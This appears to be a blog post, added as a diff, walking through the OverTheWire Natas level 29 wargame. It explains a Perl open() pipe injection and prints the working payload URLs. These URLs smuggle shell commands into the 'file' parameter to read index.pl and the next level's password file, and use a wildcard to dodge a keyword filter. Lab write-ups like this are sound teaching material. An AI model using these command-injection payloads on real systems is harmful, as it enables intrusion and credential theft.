@@ -1,0 +1,60 @@
+---
+layout: post
+title:  "Natas Level 28 → Level 29"
+date:   2021-06-07 17:23:26
+categories: ctf wargames web-security
+tags: wargames ctf overthewire web-security
+series: "OverTheWire: Natas"
+excerpt: Wall's wall
+mathjax: false
+---
+
+## Level Goal
+Excluding the URL and username, the Level Goal section is blank for the Natas ctf.
+
+
+## Solution
+The natas29 site greets us with leetspeek and a dropdown menu. Selecting any of the "perl underground" options displays a rather long text. Unsurprisingly we see from the URL that the site is using Perl. No source code is available.
+
+The first thing that came to mind was a BlackHat talk named, [The Perl Jam 2: The Camel Strikes Back](https://www.youtube.com/watch?v=BYl3-c2JSL8). This talk covers several flaws in Perl, one of which was an RCE that could be done by appending a pipe to the URL. You can watch a quick explanation start at [22:44](https://youtu.be/BYl3-c2JSL8?t=1364) and ending around 23:16 as to what is happening.
+
+The natas29 site seems a bit sensitive to how the URL is constructed. Unlike the video above, we need to end our command with a semicolon and it must be URL Encoded otherwise, the payload fails. There's no harm or need to URL Encode spaces. Also, we can ignore the filename and start our payload with a pipe.
+
+Enter the following URL into your browser:
+```
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat /etc/natas_webpass/natas30%3b
+```
+
+Instead of seeing the password, we see **meeeeeep!** Let's change our payload to index.pl to see what's going on.
+```
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%3b
+```
+
+The output is too difficult to look at on the rendered page. View the source for the webpage and you'll see the following:
+```perl
+if(param('file')){
+    $f=param('file');
+    if($f=~/natas/){
+        print "meeeeeep!<br>";
+    }
+    else{
+        open(FD, "$f.txt");
+        print "<pre>";
+        while (<FD>){
+            print CGI::escapeHTML($_);
+        }
+        print "</pre>";
+    }
+}
+```
+
+Here we see the filtering that was responsible for the "meeeeeep!" message. We also see the call to **open()** that allows this attack to work. We also see why we need a semicolon. The code appends **.txt** to the name of the file passed into open().
+
+To get the password we can bypass the filters by using some very basic regex. I've randomly chosen to use replace the letter 't' in natas and used the question-mark operator. The question-mark operator will allow us to match either zero or one character at the given location.
+
+Here's the URL I used
+```
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/na?as_webpass/na?as30%3b
+```
+
+The site will present you with the password for the next level.
